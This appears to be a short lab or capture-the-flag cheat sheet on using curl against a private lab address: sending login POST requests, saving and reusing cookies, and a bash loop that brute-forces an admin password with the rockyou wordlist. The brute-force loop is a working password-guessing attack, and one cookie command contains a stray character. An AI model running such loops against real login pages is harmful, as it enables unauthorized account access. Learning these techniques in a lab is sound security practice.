## POST request

````shell
curl -i -X POST -d 'username=admin&password=admin' 'http://10.67.175.168/post.php'
````


## Cookies

`-c file` to save cookies:

````shell
curl -c cookies.txt -i -X POST -d 'username=admin&password=admin' 'http://10.67.175.168/login.php'
````

`-b file` to use the saved cookies cookies:

````shell
curl -b cookies.txt -i -'http://10.67.175.168/dashboard.php'
````


## Bruteforce

[install wordlist](https://github.com/TurboLabIt/cybersec/blob/main/script/wordlist/install.sh).

Then:

````shell
for pass in $(cat /usr/share/wordlists/rockyou.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.67.175.168/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
````
